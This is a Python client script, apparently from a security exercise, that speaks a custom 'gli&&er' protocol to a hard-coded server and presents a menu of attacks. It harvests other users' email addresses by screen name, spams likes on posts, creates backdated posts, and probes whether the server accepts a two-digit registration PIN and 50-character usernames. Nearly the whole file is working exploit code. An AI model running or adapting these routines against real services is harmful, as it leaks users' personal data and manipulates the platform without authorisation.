import socket
import random
import string
from datetime import datetime

SERVER_HOST = "54.187.16.171"
SERVER_PORT = 1336
CURRENT_USER = ""

def establish_connection():
    """
    Establishes a socket connection to the server.

    :return: The socket connection object.
    :rtype: socket.socket
    """
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((SERVER_HOST, SERVER_PORT))
    return connection

def test_long_username():
    """
    Tests if the server accepts a registration with a username longer than the standard limit.

    :return: True if the server approves the long username, False otherwise.
    :rtype: bool
    """
    conn = establish_connection()
    oversized_name = ""
    for i in range(50):
        oversized_name += random.choice(string.ascii_uppercase)
    registration_data = f"150#{{gli&&er}}{{\"registration_code\":\"12345\",\"user\":{{\"screen_name\":\"DanielHamagniv\",\"avatar\":\"im1\",\"description\":\"magniv\",\"privacy\":\"Public\",\"id\":-1,\"user_name\":\"{oversized_name}\",\"password\":\"180509\",\"gender\":\"Male\",\"mail\":\"daniel@gaaon.fun\"}}}}##"
    conn.sendall(registration_data.encode())
    server_response = conn.recv(1024).decode()
    conn.close()
    return "approved" in server_response

def compute_checksum(input_string):
    """
    Computes a simple checksum for a given string by summing the ASCII values of its characters.

    :param input_string: The string to process.
    :type input_string: str
    :return: The calculated checksum.
    :rtype: int
    """
    total = 0
    for char in input_string:
        total += ord(char)
    return total

def extract_user_data(server_response):
    """
    Parses the server's response string to extract user details like ID and screen name.

    :param server_response: The raw response string from the server.
    :type server_response: str
    :return: A dictionary containing the user's ID and screen name.
    :rtype: dict
    """
    extracted_data = {}
    
    if '"screen_name":"' in server_response:
        start_idx = server_response.find('"screen_name":"') + 15
        end_idx = server_response.find('"', start_idx)
        extracted_data['screen_name'] = server_response[start_idx:end_idx]

    if '"id":' in server_response:
        start_idx = server_response.find('"id":') + 5
        end_idx = server_response.find(',', start_idx)
        if end_idx == -1:
            end_idx = server_response.find('}', start_idx)
        extracted_data['id'] = int(server_response[start_idx:end_idx].strip())
    
    
    return extracted_data

def harvest_email_address(connection, target_name):
    """
    Searches for a user by their screen name and attempts to retrieve their email address.

    :param connection: The active socket connection to the server.
    :type connection: socket.socket
    :param target_name: The screen name of the user to search for.
    :type target_name: str
    :return: A formatted string with the user's details or an error message.
    :rtype: str
    """
    try:
        search_request = (f'300#{{gli&&er}}{{"search_type":"SIMPLE", "search_entry":"{target_name}"}}##').encode()
        connection.sendall(search_request)
    except Exception as error:
        return f"Error during email retrieval -> {error}"
    
    server_reply = connection.recv(1024).decode()
    
    email_data = find_email_in_response(server_reply, target_name)
    
    if email_data:
        return f"Username: {email_data['screen_name']}, Email: {email_data['mail']}"
    else:
        return "User not found"

def test_weak_pin():
    """
    Tests if the server accepts a new user registration with a very short registration code.

    :return: True if the server approves the registration, False otherwise.
    :rtype: bool
    """
    conn = establish_connection()
    random_name = ""
    for i in range(50):
        random_name += random.choice(string.ascii_uppercase)
    registration_packet = f"150#{{gli&&er}}{{\"registration_code\":\"18\",\"user\":{{\"screen_name\":\"{random_name}\",\"avatar\":\"im1\",\"description\":\"magniv\",\"privacy\":\"Public\",\"id\":-1,\"user_name\":\"{random_name}\",\"password\":\"180509\",\"gender\":\"Male\",\"mail\":\"daniel@gaaon.fun\"}}}}##"
    conn.sendall(registration_packet.encode())
    reply = conn.recv(1024).decode()
    conn.close()
    return "approved" in reply

def authenticate_user(username, pwd, connection):
    """
    Authenticates a user with the server using their username and password.

    :param username: The user's username for login.
    :type username: str
    :param pwd: The user's password for login.
    :type pwd: str
    :param connection: The active socket connection to the server.
    :type connection: socket.socket
    :return: A dictionary with user data upon successful authentication, None otherwise.
    :rtype: dict or None
    """
    global CURRENT_USER
    try:
        auth_packet = ('100#{gli&&er}{"user_name":"' + username + '", "password":"' + pwd + '", "enable_push_notifications":true}##').encode()
        connection.sendall(auth_packet)
        connection.recv(1024)
        verification_sum = compute_checksum(f"{username}{pwd}")
        verification_packet = (f'110#{{gli&&er}}{verification_sum}##').encode()
        connection.sendall(verification_packet)
        auth_response = connection.recv(1024).decode()
        if "approved" in auth_response:
            auth_response = auth_response.replace("115#Authentication approved{gli&&er}", "").replace("##", "")
            user_details = extract_user_data(auth_response)
            CURRENT_USER = user_details
            return user_details
        else:
            print("Authentication failed")
    except Exception as error:
        print(f"Authentication error: {error}")

def find_email_in_response(response_data, username_target):
    """
    Parses a server response to find the email associated with a specific username.

    :param response_data: The raw response string from the server.
    :type response_data: str
    :param username_target: The screen name of the user to find.
    :type username_target: str
    :return: A dictionary with the user's screen name and email if found, None otherwise.
    :rtype: dict or None
    """
    search_string = f'"screen_name":"{username_target}"'
    
    if search_string not in response_data:
        return None
    
    position = response_data.find(search_string)
    
    email_marker = '"mail":"'
    email_position = response_data.find(email_marker, position)
    
    if email_position == -1:
        return None
    
    email_position += len(email_marker)
    email_end_pos = response_data.find('"', email_position)
    
    if email_end_pos == -1:
        return None
    
    extracted_email = response_data[email_position:email_end_pos]
    
    return {'screen_name': username_target, 'mail': extracted_email}

def create_backdated_post(connection, user_id):
    """
    Creates a post with a fixed, historical time.

    :param connection: The active socket connection to the server.
    :type connection: socket.socket
    :param user_id: The ID of the user creating the post.
    :type user_id: int
    :return: True if the server approves the post, False otherwise.
    :rtype: bool
    """
    historical_date = "2009-05-18T01:18:05.09Z"
    post_data = f"550#{{gli&&er}}{{\"feed_owner_id\":{user_id}, \"publisher_id\":{user_id}, \"publisher_screen_name\":\"Daniel\", \"publisher_avatar\":\"im1\",\"background_color\":\"yellow\",\"date\":\"{historical_date}\",\"content\":\"time travel\",\"font_color\":\"black\",\"id\":-1}}##"
    connection.sendall(post_data.encode())
    response = connection.recv(1024).decode()
    return "approved" in response

def generate_post_for_likes(connection, user_id, display_name):
    """
    Generates a new post on the server and retrieves its unique ID.

    :param connection: The active socket connection to the server.
    :type connection: socket.socket
    :param user_id: The ID of the user creating the post.
    :type user_id: int
    :param display_name: The screen name of the user.
    :type display_name: str
    :return: The ID of the newly created post, or None if unsuccessful.
    :rtype: str or None
    """
    current_time = str(datetime.utcnow()).replace(" ", "T")
    current_time = current_time[0:23] + "Z"
    
    post_packet = f"550#{{gli&&er}}{{\"feed_owner_id\":{user_id},\"publisher_id\":{user_id},\"publisher_screen_name\":\"{display_name}\",\"publisher_avatar\":\"im1\",\"background_color\":\"White\",\"date\":\"{current_time}\",\"content\":\"The bombing works\",\"font_color\":\"black\",\"id\":-1}}##"
    connection.sendall(post_packet.encode())
    post_reply = str(connection.recv(32768).decode())

    id_marker = '"id":'
    
    if id_marker not in post_reply:
        return None
    
    id_position = post_reply.find(id_marker)
    
    id_position += len(id_marker)
    id_end_position = post_reply.find('}', id_position)
    
    if id_end_position == -1:
        return None
    
    post_id = post_reply[id_position:id_end_position]
    
    return post_id

def execute_like_spam(connection, display_name, user_id):
    """
    Creates a new post and then sends multiple 'like' requests for that post.

    :param connection: The active socket connection to the server.
    :type connection: socket.socket
    :param display_name: The screen name of the user.
    :type display_name: str
    :param user_id: The ID of the user.
    :type user_id: int
    :return: 0 on success, 1 on failure.
    :rtype: int
    """
    post_identifier = generate_post_for_likes(connection, user_id, display_name)
    like_packet = f"710#{{gli&&er}}{{\"glit_id\":{post_identifier},\"user_id\":{user_id},\"user_screen_name\":\"{display_name}\",\"id\":-1}}##"
    if post_identifier != -1:    
        for i in range(4):
            connection.sendall(like_packet.encode())
            connection.recv(1024)
        return 0
    else:
        return 1

def main():
    session = None
    authenticated_user = None
    
    print("\nAuthentication required...")
    user_input = input("Username: ")
    pass_input = input("Password: ")
    
    try:
        session = establish_connection()
        authenticated_user = authenticate_user(user_input, pass_input, session)
        
        if not authenticated_user:
            print("\nAuthentication unsuccessful. Terminating...")
            return
            
        print(f"\nWelcome: {authenticated_user['screen_name']}")
        
    except Exception as error:
        print(f"\nConnection failed: {error}")
        return
    
    while True:
        print("AVAILABLE OPTIONS:")
        print("[1] - Extract Email")
        print("[2] - Spam Likes")
        print("[3] - Historical Post")
        print("[4] - Test Weak PIN")
        print("[5] - Test Long Username")
        print("[0] - Quit")
        
        selection = input("\nChoose action [0-5]: ")
        
        if selection == "1":
            print("\nEMAIL EXTRACTION TOOL")
            target_account = input("Target username: ")
            print("\nProcessing request...")
            
            email_result = harvest_email_address(session, target_account)
            if email_result:
                print("\nExtraction successful:")
                print(email_result)
            else:
                print("\nNo data retrieved")
                
        elif selection == "2":
            print("\nLIKE SPAM TOOL")
            target_account = input("Target username: ")
            account_id = input("Target ID: ")
            
            try:
                account_id = int(account_id)
                print("\nGenerating content...")
                spam_result = execute_like_spam(session, target_account, account_id)
                
                if spam_result == 0:
                    print("\n4 likes added successfully!")

            except ValueError:
                print("\nInvalid ID provided")
                
        elif selection == "3":
            print("\nHISTORICAL POST TOOL")
            print("Posting with date: 2009-05-18")
            
            if create_backdated_post(session, authenticated_user['id']):
                print("\nHistorical post created!")
            else:
                print("\nPost creation failed")
                
        elif selection == "4":
            print("\nTESTING WEAK PIN")
            print("Attempting with 2-digit PIN...")
            
            if test_weak_pin():
                print("\nSECURITY ISSUE: Weak PIN accepted!")
            else:
                print("\nWeak PIN correctly rejected")
                
        elif selection == "5":
            print("\nTESTING LONG USERNAME")
            print("Attempting with 50-character username...")
            
            if test_long_username():
                print("\nSECURITY ISSUE: Long username accepted!")
            else:
                print("\nLong username correctly rejected")
                
        elif selection == "0":
            print("\nTerminating session...")
            if session:
                session.close()
            print("Session ended successfully")
            break
            
        else:
            print("\nInvalid selection. Choose 0-5")
        
        input("\nContinue? Press Enter...\n")

if __name__ == "__main__":
    main()